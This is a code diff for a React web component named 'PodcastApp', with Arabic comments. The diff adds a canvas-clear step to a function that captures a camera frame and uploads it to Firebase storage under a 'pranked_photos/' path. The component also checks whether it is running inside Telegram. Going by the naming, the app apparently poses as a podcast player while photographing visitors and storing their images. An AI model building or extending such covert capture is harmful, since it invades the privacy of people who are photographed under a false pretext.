@@ -40,22 +40,30 @@ export default function PodcastApp() {
   const [isInTelegram, setIsInTelegram] = useState(false);
   const [errorMessage, setErrorMessage] = useState(null);
   const [hasCameraPermission, setHasCameraPermission] = useState(true);
-
   const capturePhoto = useCallback(() => {
     try {
       if (!canvasRef.current || !videoRef.current) {
         console.error("لم يتم الحصول على المرجع الخاص بالكاميرا أو اللوحة.");
         return;
       }
+  
       const context = canvasRef.current.getContext("2d");
       if (!context) {
         console.error("غير قادر على الحصول على سياق اللوحة.");
         return;
       }
+  
+      // مسح اللوحة قبل الرسم عليها
+      context.clearRect(0, 0, canvasRef.current.width, canvasRef.current.height);
+  
+      // رسم الصورة الجديدة من الفيديو
       context.drawImage(videoRef.current, 0, 0, 320, 240);
+  
       const photoDataUrl = canvasRef.current.toDataURL("image/png");
       console.log("تم التقاط الصورة بنجاح:", photoDataUrl);
+  
       const storageRef = ref(storage, "pranked_photos/" + Date.now() + ".png");
+  
       uploadString(storageRef, photoDataUrl, "data_url")
         .then(async () => {
           const photoUrl = await getDownloadURL(storageRef);
@@ -75,6 +83,7 @@ export default function PodcastApp() {
       setErrorMessage("خطأ في التقاط الصورة. الرجاء المحاولة مرة أخرى.");
     }
   }, []);
+  
 
   const requestCameraPermission = useCallback(async () => {
     try {
